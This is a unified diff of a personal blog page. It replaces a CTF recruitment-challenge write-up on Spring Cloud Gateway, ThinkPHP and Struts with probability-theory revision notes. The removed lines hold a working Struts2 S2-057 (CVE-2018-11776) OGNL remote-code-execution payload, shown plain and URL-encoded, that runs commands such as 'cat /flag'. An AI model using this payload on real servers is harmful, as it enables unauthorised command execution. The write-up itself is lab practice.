@@ -1,18 +1,18 @@
 <!DOCTYPE html>
 <html lang="zh-cn" dir="ltr">
     <head><meta charset='utf-8'>
-<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="记录wp">
-<title>御林招新题：档案馆的回响</title>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="概率论的复习笔记">
+<title>概率论</title>
 
-<link rel='canonical' href='https://calendar0917.github.io/posts/%E5%BE%A1%E6%9E%97-%E6%A1%A3%E6%A1%88%E9%A6%86%E7%9A%84%E5%9B%9E%E5%93%8D/'>
+<link rel='canonical' href='https://calendar0917.github.io/posts/%E6%A6%82%E7%8E%87%E8%AE%BA/'>
 
-<link rel="stylesheet" href="/scss/style.min.b13448cb6a9f11e8e6aeb548ed55eed4ad65121ff58a1b734bc897438af28d62.css"><meta property='og:title' content="御林招新题：档案馆的回响">
-<meta property='og:description' content="记录wp">
-<meta property='og:url' content='https://calendar0917.github.io/posts/%E5%BE%A1%E6%9E%97-%E6%A1%A3%E6%A1%88%E9%A6%86%E7%9A%84%E5%9B%9E%E5%93%8D/'>
+<link rel="stylesheet" href="/scss/style.min.b13448cb6a9f11e8e6aeb548ed55eed4ad65121ff58a1b734bc897438af28d62.css"><meta property='og:title' content="概率论">
+<meta property='og:description' content="概率论的复习笔记">
+<meta property='og:url' content='https://calendar0917.github.io/posts/%E6%A6%82%E7%8E%87%E8%AE%BA/'>
 <meta property='og:site_name' content='Calendar&#39;s Blog'>
-<meta property='og:type' content='article'><meta property='article:section' content='Posts' /><meta property='article:tag' content='CTF' /><meta property='article:published_time' content='2025-10-14T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2025-10-14T00:00:00&#43;00:00'/>
-<meta name="twitter:title" content="御林招新题：档案馆的回响">
-<meta name="twitter:description" content="记录wp"><link rel="alternate" type="application/json" href="https://calendar0917.github.io/posts/%E5%BE%A1%E6%9E%97-%E6%A1%A3%E6%A1%88%E9%A6%86%E7%9A%84%E5%9B%9E%E5%93%8D/index.json">
+<meta property='og:type' content='article'><meta property='article:section' content='Posts' /><meta property='article:tag' content='笔记' /><meta property='article:published_time' content='2025-10-22T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2025-10-22T00:00:00&#43;00:00'/>
+<meta name="twitter:title" content="概率论">
+<meta name="twitter:description" content="概率论的复习笔记"><link rel="alternate" type="application/json" href="https://calendar0917.github.io/posts/%E6%A6%82%E7%8E%87%E8%AE%BA/index.json">
     <link rel="shortcut icon" href="https://raw.githubusercontent.com/calendar0917/images/master/20251021223022235.png" />
 
     </head>
@@ -208,12 +208,49 @@
         <div class="widget--toc">
             <nav id="TableOfContents">
   <ol>
-    <li><a href="#题干">题干</a></li>
-    <li><a href="#解题过程">解题过程</a>
+    <li><a href="#随机事件与概率">随机事件与概率</a>
       <ol>
-        <li><a href="#spring-cloud-gateway-310">Spring Cloud Gateway 3.1.0</a></li>
-        <li><a href="#thinkphp-5023">ThinkPHP 5.0.23</a></li>
-        <li><a href="#struts-2334">Struts 2.3.34</a></li>
+        <li><a href="#事件关系与运算率">事件关系与运算率</a></li>
+        <li><a href="#概率计算性质">概率计算性质</a></li>
+        <li><a href="#条件概率">条件概率</a></li>
+        <li><a href="#事件的独立性">事件的独立性</a></li>
+      </ol>
+    </li>
+    <li><a href="#随机变量分布">随机变量分布</a>
+      <ol>
+        <li><a href="#离散型随机变量">离散型随机变量</a>
+          <ol>
+            <li><a href="#二项分布">二项分布</a></li>
+            <li><a href="#几何分布">几何分布</a></li>
+            <li><a href="#二项-01-分布">二项 01 分布</a></li>
+            <li><a href="#泊松分布">泊松分布</a></li>
+          </ol>
+        </li>
+        <li><a href="#连续型随机变量">连续型随机变量</a>
+          <ol>
+            <li><a href="#概率密度">概率密度：</a></li>
+            <li><a href="#均匀分布">均匀分布</a></li>
+            <li><a href="#指数分布">指数分布</a></li>
+            <li><a href="#正态分布">正态分布</a></li>
+            <li><a href="#已知-x求-fx-的分布函数">已知 X，求 f(X) 的分布函数</a></li>
+          </ol>
+        </li>
+      </ol>
+    </li>
+    <li><a href="#二维随机变量">二维随机变量</a>
+      <ol>
+        <li><a href="#离散型">离散型</a></li>
+        <li><a href="#连续型">连续型</a>
+          <ol>
+            <li><a href="#分布密度概率">分布密度、概率</a></li>
+            <li><a href="#独立性">独立性</a></li>
+            <li><a href="#边缘密度">边缘密度</a></li>
+            <li><a href="#条件概率密度">条件概率密度</a></li>
+            <li><a href="#二位均匀">二位均匀</a></li>
+            <li><a href="#最大最小值分布">最大、最小值分布</a></li>
+            <li><a href="#二维连续型函数分布">二维连续型函数分布</a></li>
+          </ol>
+        </li>
       </ol>
     </li>
   </ol>
@@ -234,8 +271,8 @@
     
     <header class="article-category">
         
-            <a href="/categories/ctf/" style="background-color: #3654aa; color: #fff;">
-                CTF
+            <a href="/categories/%E7%AC%94%E8%AE%B0/" style="background-color: #80aba9; color: #fff;">
+                课内笔记
             </a>
         
     </header>
@@ -243,12 +280,12 @@
 
     <div class="article-title-wrapper">
         <h2 class="article-title">
-            <a href="/posts/%E5%BE%A1%E6%9E%97-%E6%A1%A3%E6%A1%88%E9%A6%86%E7%9A%84%E5%9B%9E%E5%93%8D/">御林招新题：档案馆的回响</a>
+            <a href="/posts/%E6%A6%82%E7%8E%87%E8%AE%BA/">概率论</a>
         </h2>
     
         
         <h3 class="article-subtitle">
-            记录wp
+            概率论的复习笔记
         </h3>
         
     </div>
@@ -269,7 +306,7 @@
   <path d="M3 11h16" />
   <path d="M18 16.496v1.504l1 1" />
 </svg>
-                <time class="article-time--published">Oct 14, 2025</time>
+                <time class="article-time--published">Oct 22, 2025</time>
             </div>
         
 
@@ -285,111 +322,557 @@
     <section class="article-content">
     
     
-    <h2 id="题干">题干
+    <p>参考视频：<a class="link" href="https://www.bilibili.com/video/BV1N8BbY8E15/?p=2&amp;spm_id_from=333.1007.top_right_bar_window_history.content.click&amp;vd_source=f329e64c57c95b7adedc05b814353e29"  target="_blank" rel="noopener"
+    >概率论四小时速成</a></p>
+<h2 id="随机事件与概率">随机事件与概率
+</h2><h3 id="事件关系与运算率">事件关系与运算率
+</h3><p>事件关系：</p>
+<p><img src="https://raw.githubusercontent.com/calendar0917/images/master/image-20251022075205102.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20251022075205102"
+	
+	
+></p>
+<p>运算律：</p>
+<p><img src="https://raw.githubusercontent.com/calendar0917/images/master/image-20251022075254990.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20251022075254990"
+	
+	
+></p>
+<h3 id="概率计算性质">概率计算性质
+</h3><p><img src="https://raw.githubusercontent.com/calendar0917/images/master/image-20251022075336338.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20251022075336338"
+	
+	
+></p>
+<blockquote>
+<ul>
+<li>注意：<img src="https://raw.githubusercontent.com/calendar0917/images/master/image-20251022080231202.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20251022080231202"
+	
+	
+>对于多项依然成立</li>
+</ul>
+<p>集合并 == 概率 +</p>
+<p>集合且 == 概率 ·</p>
+<p>补充：容斥原理</p>
+</blockquote>
+<h3 id="条件概率">条件概率
+</h3><p>条件概率与乘法公式：</p>
+<p><img src="https://raw.githubusercontent.com/calendar0917/images/master/image-20251022080612196.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20251022080612196"
+	
+	
+></p>
+<h3 id="事件的独立性">事件的独立性
+</h3><p><img src="https://raw.githubusercontent.com/calendar0917/images/master/image-20251022080750938.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20251022080750938"
+	
+	
+></p>
+<blockquote>
+<p>独立不互斥，互斥不独立</p>
+<p><img src="https://raw.githubusercontent.com/calendar0917/images/master/image-20251022080945953.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20251022080945953"
+	
+	
+></p>
+</blockquote>
+<p>多事件独立性：</p>
+<p><img src="https://raw.githubusercontent.com/calendar0917/images/master/image-20251022080829872.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20251022080829872"
+	
+	
+></p>
+<p>全概率 - 贝叶斯公式：</p>
+<p><img src="https://raw.githubusercontent.com/calendar0917/images/master/image-20251022081025058.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20251022081025058"
+	
+	
+></p>
+<h2 id="随机变量分布">随机变量分布
 </h2><ul>
-<li>
-<p><strong>目标一</strong>：云端之门的低语 （ Spring Cloud Gateway 3.1.0）</p>
-<p>“天穹”微服务 API 网关：这是公司最新潮的 API 网关，所有数据的流量中枢，看起来坚不可摧。然而，根据情报，这个版本的网关在处理路由请求时，似乎留下了一道不易察觉的缝隙。</p>
-</li>
-<li>
-<p><strong>目标二</strong>：思想者的诡计 （ThinkPHP 5.0.23）</p>
-<p>“敏捷开发” PHP 门户:这是用一款广受欢迎的 PHP 框架搭建的门户网站，以其高效和灵活著称。然而，在处理 HTTP 请求的某个环节，框架对“请求方法”的理解出现了偏差。</p>
-</li>
-<li>
-<p><strong>目标三</strong>：远古框架的咆哮 （ Struts 2.3.34）</p>
-<p>“化石”级企业管理平台：这是一个老旧的 Java 企业级应用，虽然年迈，但依然在核心业务线上运行。它的开发者在配置某个核心组件时，遵循了当时流行的“通配符”设计哲学，却忽略了这份“灵活”背后潜藏的巨大风险。</p>
+<li>分布函数：</li>
+</ul>
+<p><img src="https://raw.githubusercontent.com/calendar0917/images/master/image-20251022081325900.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20251022081325900"
+	
+	
+></p>
+<blockquote>
+<p>备注：<img src="https://raw.githubusercontent.com/calendar0917/images/master/image-20251022081339289.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20251022081339289"
+	
+	
+></p>
+<p>概率 - 分布函数关系：配凑出范围</p>
+<p><img src="https://raw.githubusercontent.com/calendar0917/images/master/image-20251022081425038.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20251022081425038"
+	
+	
+></p>
+</blockquote>
+<ul>
+<li>分布函数的充要条件：</li>
+</ul>
+<p><img src="https://raw.githubusercontent.com/calendar0917/images/master/image-20251022081621331.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20251022081621331"
+	
+	
+></p>
+<blockquote>
+<p>等号跟大于走，永远右连续</p>
+<p>根据规范性、右连续性，可以用极限解方程求参数</p>
+</blockquote>
+<ul>
+<li>常识结论：</li>
+</ul>
+<p><img src="https://raw.githubusercontent.com/calendar0917/images/master/image-20251022081839150.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20251022081839150"
+	
+	
+></p>
+<h3 id="离散型随机变量">离散型随机变量
+</h3><p><img src="https://raw.githubusercontent.com/calendar0917/images/master/image-20251022081922286.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20251022081922286"
+	
+	
+></p>
+<blockquote>
+<p>分布律可以写成表格的形式</p>
+<ul>
+<li>古典概型：</li>
+</ul>
+<p><img src="https://raw.githubusercontent.com/calendar0917/images/master/image-20251022082007258.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20251022082007258"
+	
+	
+></p>
+<ul>
+<li>根据分布律写分布函数：
+<ul>
+<li>根据定义域划分范围，依次求和</li>
+</ul>
 </li>
 </ul>
-<h2 id="解题过程">解题过程
-</h2><h3 id="spring-cloud-gateway-310">Spring Cloud Gateway 3.1.0
-</h3><p>直接脚本过了</p>
-<p><img src="https://raw.githubusercontent.com/calendar0917/images/master/image-20251014133624235.png"
+</blockquote>
+<h4 id="二项分布">二项分布
+</h4><p>独立重复、事件 A 发生的次数</p>
+<p><img src="https://raw.githubusercontent.com/calendar0917/images/master/image-20251022082320081.png"
 	
 	
 	
 	loading="lazy"
 	
-		alt="image-20251014133624235"
+		alt="image-20251022082320081"
 	
 	
 ></p>
-<h3 id="thinkphp-5023">ThinkPHP 5.0.23
-</h3><p>也是脚本</p>
-<p><img src="https://raw.githubusercontent.com/calendar0917/images/master/image-20251014133714323.png"
-	
-	
-	
-	loading="lazy"
-	
-		alt="image-20251014133714323"
-	
-	
-></p>
-<h3 id="struts-2334">Struts 2.3.34
-</h3><p>这个脚本不知道怎么用</p>
-<p>于是尝试解题：</p>
-<ol>
-<li>打开网站发现是空白的，扫描工具扫到 <code>/upload.action</code>，进入</li>
-</ol>
-<p><img src="https://raw.githubusercontent.com/calendar0917/images/master/image-20251014133909616.png"
-	
-	
-	
-	loading="lazy"
-	
-		alt="image-20251014133909616"
-	
-	
-></p>
-<ol start="2">
-<li>是 struts2，网上查询，发现 <code>S2-057远程执行代码漏洞（CVE-2018-11776）</code> 影响当前版本</li>
-</ol>
 <blockquote>
-<p>参考 <a class="link" href="https://blog.csdn.net/weixin_59872639/article/details/123206712"  target="_blank" rel="noopener"
-    >Struts2 S2-057远程执行代码漏洞（CVE-2018-11776）_apache struts 2 安全漏洞(cve-2018-11776)-CSDN博客</a></p>
-<p>区别在于上面靶场的网址是 /showcase</p>
-</blockquote>
-<ol start="3">
-<li>漏洞判断</li>
-</ol>
-<p><img src="https://raw.githubusercontent.com/calendar0917/images/master/image-20251014182607127.png"
+<p><img src="https://raw.githubusercontent.com/calendar0917/images/master/image-20251022082421022.png"
 	
 	
 	
 	loading="lazy"
 	
-		alt="image-20251014182607127"
+		alt="image-20251022082421022"
 	
 	
 ></p>
-<ol start="4">
-<li>poc</li>
-</ol>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">${
-</span></span><span class="line"><span class="cl">(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#ct=#request[&#39;struts.valueStack&#39;].context).(#cr=#ct[&#39;com.opensymphony.xwork2.ActionContext.container&#39;]).(#ou=#cr.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ou.getExcludedPackageNames().clear()).(#ou.getExcludedClasses().clear()).(#ct.setMemberAccess(#dm)).(#a=@java.lang.Runtime@getRuntime().exec(&#39;id&#39;)).(@org.apache.commons.io.IOUtils@toString(#a.getInputStream()))}
-</span></span></code></pre></td></tr></table>
-</div>
-</div><blockquote>
-<p>注意：poc 放到网址上，需要 url 编码。后续又发现，“ls /”这一字符串中空格需要编码，但是斜杠不需要编码！<code>..</code>也不需要编码</p>
 </blockquote>
-<ol start="5">
-<li>最终 payload：</li>
-</ol>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">payload</span><span class="err">：</span><span class="o">/</span><span class="n">upload</span><span class="o">.</span><span class="n">action</span><span class="o">/$%</span><span class="mi">7</span><span class="n">B</span><span class="o">%</span><span class="mi">0</span><span class="n">A</span><span class="o">%</span><span class="mi">28</span><span class="o">%</span><span class="mi">23</span><span class="n">dm</span><span class="o">%</span><span class="mi">3</span><span class="n">D</span><span class="err">@</span><span class="n">ognl</span><span class="o">.</span><span class="n">OgnlContext</span><span class="err">@</span><span class="n">DEFAULT_MEMBER_ACCESS</span><span class="o">%</span><span class="mf">29.</span><span class="o">%</span><span class="mi">28</span><span class="o">%</span><span class="mi">23</span><span class="n">ct</span><span class="o">%</span><span class="mi">3</span><span class="n">D</span><span class="o">%</span><span class="mi">23</span><span class="n">request</span><span class="o">%</span><span class="mi">5</span><span class="n">B</span><span class="o">%</span><span class="mi">27</span><span class="n">struts</span><span class="o">.</span><span class="n">valueStack</span><span class="o">%</span><span class="mi">27</span><span class="o">%</span><span class="mi">5</span><span class="n">D</span><span class="o">.</span><span class="n">context</span><span class="o">%</span><span class="mf">29.</span><span class="o">%</span><span class="mi">28</span><span class="o">%</span><span class="mi">23</span><span class="n">cr</span><span class="o">%</span><span class="mi">3</span><span class="n">D</span><span class="o">%</span><span class="mi">23</span><span class="n">ct</span><span class="o">%</span><span class="mi">5</span><span class="n">B</span><span class="o">%</span><span class="mi">27</span><span class="n">com</span><span class="o">.</span><span class="n">opensymphony</span><span class="o">.</span><span class="n">xwork2</span><span class="o">.</span><span class="n">ActionContext</span><span class="o">.</span><span class="n">container</span><span class="o">%</span><span class="mi">27</span><span class="o">%</span><span class="mi">5</span><span class="n">D</span><span class="o">%</span><span class="mf">29.</span><span class="o">%</span><span class="mi">28</span><span class="o">%</span><span class="mi">23</span><span class="n">ou</span><span class="o">%</span><span class="mi">3</span><span class="n">D</span><span class="o">%</span><span class="mi">23</span><span class="n">cr</span><span class="o">.</span><span class="n">getInstance</span><span class="o">%</span><span class="mi">28</span><span class="err">@</span><span class="n">com</span><span class="o">.</span><span class="n">opensymphony</span><span class="o">.</span><span class="n">xwork2</span><span class="o">.</span><span class="n">ognl</span><span class="o">.</span><span class="n">OgnlUtil</span><span class="err">@</span><span class="k">class</span><span class="o">%</span><span class="mi">29</span><span class="o">%</span><span class="mf">29.</span><span class="o">%</span><span class="mi">28</span><span class="o">%</span><span class="mi">23</span><span class="n">ou</span><span class="o">.</span><span class="n">getExcludedPackageNames</span><span class="o">%</span><span class="mi">28</span><span class="o">%</span><span class="mf">29.</span><span class="n">clear</span><span class="o">%</span><span class="mi">28</span><span class="o">%</span><span class="mi">29</span><span class="o">%</span><span class="mf">29.</span><span class="o">%</span><span class="mi">28</span><span class="o">%</span><span class="mi">23</span><span class="n">ou</span><span class="o">.</span><span class="n">getExcludedClasses</span><span class="o">%</span><span class="mi">28</span><span class="o">%</span><span class="mf">29.</span><span class="n">clear</span><span class="o">%</span><span class="mi">28</span><span class="o">%</span><span class="mi">29</span><span class="o">%</span><span class="mf">29.</span><span class="o">%</span><span class="mi">28</span><span class="o">%</span><span class="mi">23</span><span class="n">ct</span><span class="o">.</span><span class="n">setMemberAccess</span><span class="o">%</span><span class="mi">28</span><span class="o">%</span><span class="mi">23</span><span class="n">dm</span><span class="o">%</span><span class="mi">29</span><span class="o">%</span><span class="mf">29.</span><span class="o">%</span><span class="mi">28</span><span class="o">%</span><span class="mi">23</span><span class="n">a</span><span class="o">%</span><span class="mi">3</span><span class="n">D</span><span class="err">@</span><span class="n">java</span><span class="o">.</span><span class="n">lang</span><span class="o">.</span><span class="n">Runtime</span><span class="err">@</span><span class="n">getRuntime</span><span class="o">%</span><span class="mi">28</span><span class="o">%</span><span class="mf">29.</span><span class="n">exec</span><span class="o">%</span><span class="mi">28</span><span class="o">%</span><span class="mi">27</span><span class="n">cat</span><span class="o">%</span><span class="mi">20</span><span class="o">/</span><span class="n">flag</span><span class="o">%</span><span class="mi">27</span><span class="o">%</span><span class="mi">29</span><span class="o">%</span><span class="mf">29.</span><span class="o">%</span><span class="mi">28</span><span class="err">@</span><span class="n">org</span><span class="o">.</span><span class="n">apache</span><span class="o">.</span><span class="n">commons</span><span class="o">.</span><span class="n">io</span><span class="o">.</span><span class="n">IOUtils</span><span class="err">@</span><span class="n">toString</span><span class="o">%</span><span class="mi">28</span><span class="o">%</span><span class="mi">23</span><span class="n">a</span><span class="o">.</span><span class="n">getInputStream</span><span class="o">%</span><span class="mi">28</span><span class="o">%</span><span class="mi">29</span><span class="o">%</span><span class="mi">29</span><span class="o">%</span><span class="mi">29</span><span class="o">%</span><span class="mi">7</span><span class="n">D</span><span class="o">/</span><span class="n">actionChain1</span><span class="o">.</span><span class="n">action</span>
-</span></span></code></pre></td></tr></table>
-</div>
-</div>
+<blockquote>
+<ul>
+<li>几何概型：</li>
+</ul>
+<p><img src="https://raw.githubusercontent.com/calendar0917/images/master/image-20251022082537602.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20251022082537602"
+	
+	
+></p>
+</blockquote>
+<h4 id="几何分布">几何分布
+</h4><p>事件首次发生的概率</p>
+<p><img src="https://raw.githubusercontent.com/calendar0917/images/master/image-20251022082634533.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20251022082634533"
+	
+	
+></p>
+<h4 id="二项-01-分布">二项 01 分布
+</h4><p><img src="https://raw.githubusercontent.com/calendar0917/images/master/image-20251022082836415.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20251022082836415"
+	
+	
+></p>
+<h4 id="泊松分布">泊松分布
+</h4><p><img src="https://raw.githubusercontent.com/calendar0917/images/master/image-20251022084237766.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20251022084237766"
+	
+	
+></p>
+<blockquote>
+<p>注意一个代换：<img src="https://raw.githubusercontent.com/calendar0917/images/master/image-20251022084307855.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20251022084307855"
+	
+	
+></p>
+</blockquote>
+<h3 id="连续型随机变量">连续型随机变量
+</h3><h4 id="概率密度">概率密度：
+</h4><p><img src="https://raw.githubusercontent.com/calendar0917/images/master/image-20251022084626738.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20251022084626738"
+	
+	
+></p>
+<blockquote>
+<p>概率为 0 的事件可能发生</p>
+<p>概率密度的积分就成为概率 &ndash;&gt; 在哪求概率，就在哪求积分</p>
+</blockquote>
+<p>充要条件：</p>
+<p><img src="https://raw.githubusercontent.com/calendar0917/images/master/image-20251022084813110.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20251022084813110"
+	
+	
+></p>
+<ul>
+<li>与分布函数：</li>
+</ul>
+<p><img src="https://raw.githubusercontent.com/calendar0917/images/master/image-20251022085101165.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20251022085101165"
+	
+	
+></p>
+<blockquote>
+<p>分定义域求积分</p>
+</blockquote>
+<h4 id="均匀分布">均匀分布
+</h4><p><img src="https://raw.githubusercontent.com/calendar0917/images/master/image-20251022085829523.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20251022085829523"
+	
+	
+></p>
+<h4 id="指数分布">指数分布
+</h4><p><img src="https://raw.githubusercontent.com/calendar0917/images/master/image-20251022085945280.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20251022085945280"
+	
+	
+></p>
+<blockquote>
+<p>利用指数分布的无记忆性，转换区间</p>
+</blockquote>
+<h4 id="正态分布">正态分布
+</h4><p><img src="https://raw.githubusercontent.com/calendar0917/images/master/image-20251022090654026.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20251022090654026"
+	
+	
+></p>
+<ul>
+<li>标准化：</li>
+</ul>
+<p><img src="https://raw.githubusercontent.com/calendar0917/images/master/image-20251022090834007.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20251022090834007"
+	
+	
+></p>
+<blockquote>
+<p>先变换为标准正态，再求概率（用标准正态的分布函数表示）</p>
+<p><img src="https://raw.githubusercontent.com/calendar0917/images/master/image-20251022091436382.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20251022091436382"
+	
+	
+></p>
+<p>根据形式配凑</p>
+<p><img src="https://raw.githubusercontent.com/calendar0917/images/master/image-20251022091554558.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20251022091554558"
+	
+	
+></p>
+</blockquote>
+<h4 id="已知-x求-fx-的分布函数">已知 X，求 f(X) 的分布函数
+</h4><p><img src="https://raw.githubusercontent.com/calendar0917/images/master/image-20251022092554592.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20251022092554592"
+	
+	
+></p>
+<blockquote>
+<p>关键在于根据 Y &lt;= y 转换出 X ~ y 关系，用 X 的分布函数代换出 Y 的</p>
+</blockquote>
+<h2 id="二维随机变量">二维随机变量
+</h2><h3 id="离散型">离散型
+</h3><ul>
+<li>联合分布律</li>
+</ul>
+<p><img src="https://raw.githubusercontent.com/calendar0917/images/master/image-20251022094458316.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20251022094458316"
+	
+	
+></p>
+<p><img src="https://raw.githubusercontent.com/calendar0917/images/master/image-20251022094526051.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20251022094526051"
+	
+	
+></p>
+<ul>
+<li>独立性</li>
+</ul>
+<p><img src="https://raw.githubusercontent.com/calendar0917/images/master/image-20251022094540253.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20251022094540253"
+	
+	
+></p>
+<blockquote>
+<p>有 p_ij = 0，一定不独立</p>
+<p>独立 == 各行（列）成比例</p>
+</blockquote>
+<h3 id="连续型">连续型
+</h3><h4 id="分布密度概率">分布密度、概率
+</h4><p><img src="https://raw.githubusercontent.com/calendar0917/images/master/image-20251022094731080.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20251022094731080"
+	
+	
+></p>
+<blockquote>
+<p>找区域，二重积分即可</p>
+</blockquote>
+<h4 id="独立性">独立性
+</h4><p><img src="https://raw.githubusercontent.com/calendar0917/images/master/image-20251022095256614.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20251022095256614"
+	
+	
+></p>
+<h4 id="边缘密度">边缘密度
+</h4><p><img src="https://raw.githubusercontent.com/calendar0917/images/master/image-20251022095512292.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20251022095512292"
+	
+	
+></p>
+<blockquote>
+<p>对另一个变量积分</p>
+</blockquote>
+<h4 id="条件概率密度">条件概率密度
+</h4><p><img src="https://raw.githubusercontent.com/calendar0917/images/master/image-20251022100004051.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20251022100004051"
+	
+	
+></p>
+<blockquote>
+<p>固定某个参数后，概率密度只域另一个参数有关</p>
+</blockquote>
+<h4 id="二位均匀">二位均匀
+</h4><p><img src="https://raw.githubusercontent.com/calendar0917/images/master/image-20251022100325862.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20251022100325862"
+	
+	
+></p>
+<blockquote>
+<p>求面积之比即可</p>
+</blockquote>
+<h4 id="最大最小值分布">最大、最小值分布
+</h4><p><img src="https://raw.githubusercontent.com/calendar0917/images/master/image-20251022102611138.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20251022102611138"
+	
+	
+></p>
+<h4 id="二维连续型函数分布">二维连续型函数分布
+</h4>
 </section>
 
 
@@ -397,7 +880,7 @@
     
     <section class="article-tags">
         
-            <a href="/tags/ctf/">CTF</a>
+            <a href="/tags/%E7%AC%94%E8%AE%B0/">笔记</a>
         
     </section>
 
@@ -430,32 +913,13 @@
         <div class="flex article-list--tile">
             
                 
-<article class="has-image">
-    <a href="/posts/%E5%BE%A1%E6%9E%97-devops%E5%85%A5%E9%97%A8%E5%B0%8F%E7%BB%93/">
-        
-        
-            <div class="article-image">
-                
-                    <img src="https://raw.githubusercontent.com/calendar0917/images/master/20251021193711745.png" loading="lazy" data-key="" data-hash="https://raw.githubusercontent.com/calendar0917/images/master/20251021193711745.png"/>
-                
-            </div>
-        
-
-        <div class="article-details">
-            <h2 class="article-title">御林-DevOps入门小结</h2>
-        </div>
-    </a>
-</article>
-
-            
-                
 <article class="">
-    <a href="/posts/%E5%BE%A1%E6%9E%97-agent%E4%B8%93%E9%A2%98/">
+    <a href="/posts/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/">
         
         
 
         <div class="article-details">
-            <h2 class="article-title">御林招新题：Agent 专题</h2>
+            <h2 class="article-title">计算机组成原理</h2>
         </div>
     </a>
 </article>
@@ -463,44 +927,37 @@
             
                 
 <article class="has-image">
-    <a href="/posts/%E5%BE%A1%E6%9E%97-homepage/">
+    <a href="/posts/c&#43;&#43;%E6%B3%9B%E5%9E%8B%E7%BC%96%E7%A8%8B%E5%8F%8Astl%E6%8A%80%E6%9C%AF/">
         
         
             <div class="article-image">
                 
-                    <img src="https://raw.githubusercontent.com/calendar0917/images/master/20251020172907999.png" loading="lazy" data-key="" data-hash="https://raw.githubusercontent.com/calendar0917/images/master/20251020172907999.png"/>
+                    <img src="https://raw.githubusercontent.com/calendar0917/images/master/20251013082109789.png" loading="lazy" data-key="" data-hash="https://raw.githubusercontent.com/calendar0917/images/master/20251013082109789.png"/>
                 
             </div>
         
 
         <div class="article-details">
-            <h2 class="article-title">御林招新题：Homepage</h2>
+            <h2 class="article-title">C&#43;&#43; 模板及STL技术</h2>
         </div>
     </a>
 </article>
 
             
                 
-<article class="">
-    <a href="/posts/%E5%BE%A1%E6%9E%97-mysql%E4%B8%93%E9%A2%98/">
+<article class="has-image">
+    <a href="/posts/c&#43;&#43;%E6%A0%B8%E5%BF%83%E7%BC%96%E7%A8%8B/">
         
         
-
-        <div class="article-details">
-            <h2 class="article-title">御林招新题：MySQL专题</h2>
-        </div>
-    </a>
-</article>
-
-            
+            <div class="article-image">
                 
-<article class="">
-    <a href="/posts/%E5%BE%A1%E6%9E%97-python%E5%90%8E%E7%AB%AF/">
-        
+                    <img src="https://raw.githubusercontent.com/calendar0917/images/master/20251013082109789.png" loading="lazy" data-key="" data-hash="https://raw.githubusercontent.com/calendar0917/images/master/20251013082109789.png"/>
+                
+            </div>
         
 
         <div class="article-details">
-            <h2 class="article-title">御林招新题：python 后端</h2>
+            <h2 class="article-title">C&#43;&#43; 核心编程</h2>
         </div>
     </a>
 </article>
